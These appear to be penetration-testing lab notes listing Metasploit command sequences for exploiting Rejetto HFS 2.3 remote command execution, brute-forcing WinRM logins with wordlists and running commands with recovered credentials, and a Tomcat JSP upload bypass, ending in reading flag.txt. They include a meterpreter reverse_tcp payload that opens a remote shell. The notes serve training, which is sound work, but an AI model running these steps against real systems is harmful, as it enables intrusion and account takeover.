Exploiting a vulnerable HTTP file server
- an HTTP file server HFS is a web server that is designed for file and document sharing
- HTTP file server typically run on TCP port 80 and utilize the HTTP protocol for underlying communication

- rejetto HFS V2.3 is vulnerable to a remote command execution attack

vulnerable http file server lab
=
	service postgresql start
	db_status
	workspace -a HFS
	setg RHOSTS ip
	db_nmap -sS -sV -O ip
	back
	search type:exploit name:rejetto
	use 0
	show options
	set RHOSTS ip
	exploit
	set payload windows/x64/meterpreter/reverse_tcp
	show options
	exploit


## Windows HTTP file server
	cat /root/Desktop/target
	nmap --top-ports 65536 ip
	nmap -sV -p 80 ip
	searchsploit hfs
	msfconsole 
	use exploit/windows/http/rejetto_hfs_exec
	set RPORT 80
	set RHOSTS ip
	set LHOST ip
	exploit

# WinRM: Exploitation with Metasploit


	nmap -sV -O ip
	msfdb init
	service postgresql start
	msfconsole
	search type:auxiliary name:winrm

	nmap ip
	service postgresql start
	msfconsole 
	search type:auxiliary name:winrm 
	use auxiliary/scanner/winrm/winrm_login
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	set VERBOSE false
	exploit
	use auxilliary/scanner/winrm/winrm_auth_methods
	set RHOSTS ip
	exploit
	use auxiliary/scanner/winrm/winrm_cmd
	set RHOSTS ip
	set USERNAME administrator
	set PASSWORD tinkerbell
	set CMD whoami
	exploit
	use exploit/windows/winrm/winrm_script_exec
	set RHOSTS ip
	set USERNAME administrator
	set PASSWORD tinkerbell
	set FORCE_VBS true
	exploit
	cd / 
	dir
	cat flag.txt


# Windows Java Web server (Apache Tomcat web server)
	nmap --top-ports 2500 ip
	firefox ip:8080
	msfconsole
	use exploit/multi/http/tomcat_jsp_upload_bypass
	set RHOSTS ip
	cd /
	dir
	cat flag.txt
	
	